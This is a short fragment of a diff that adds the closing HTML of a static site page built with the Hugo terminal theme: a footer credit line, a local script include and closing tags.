+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
